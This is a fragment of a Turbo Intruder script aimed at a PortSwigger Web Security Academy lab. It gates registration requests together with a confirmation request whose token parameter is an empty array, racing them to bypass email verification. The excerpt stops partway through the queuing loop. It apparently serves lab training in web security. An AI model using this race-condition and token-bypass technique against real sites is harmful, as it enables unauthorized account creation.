def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )
    confirmTokenRequest = '''POST /confirm?token[]= HTTP/2
Host: 0af8006404e7115080610d59008b0008.web-security-academy.net
Cookie: phpsessionid=MwpWOoCnobr1TrUGlta4cdZpcrqzFR0A
Content-Length: 0

''' 
    MIN = 1
    MAX = 20
    for usernamePrefix in range(MIN, MAX):
        currentQueue = 'queue' + str(usernamePrefix)
        # prepare 1 registration request
        engine.queue(target.req, str(usernamePrefix), gate=currentQueue)